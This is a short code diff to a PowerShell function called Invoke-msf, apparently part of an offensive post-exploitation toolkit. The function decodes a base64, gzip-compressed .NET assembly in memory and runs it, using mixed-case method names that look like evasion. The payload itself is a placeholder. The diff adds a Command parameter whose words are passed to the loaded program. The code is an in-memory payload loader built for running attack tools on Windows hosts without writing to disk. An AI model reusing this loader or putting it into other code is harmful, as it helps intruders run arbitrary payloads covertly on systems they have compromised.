@@ -1,6 +1,15 @@
 function Invoke-msf
 {
 
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [ValidateNotNullorEmpty()]
+        [String]
+        $Command
+
+    )
+    
     $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("%%PAYLOAD%%"))
 
     $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
@@ -12,7 +21,7 @@ function Invoke-msf
     $StringWriter = New-Object IO.StringWriter
     [Console]::SetOut($StringWriter)
 
-    [hidden_test.Program]::Main("")
+    [hidden_test.Program]::Main($Command.Split(" "))
 
     [Console]::SetOut($OldConsoleOut)
     $Results = $StringWriter.ToString()
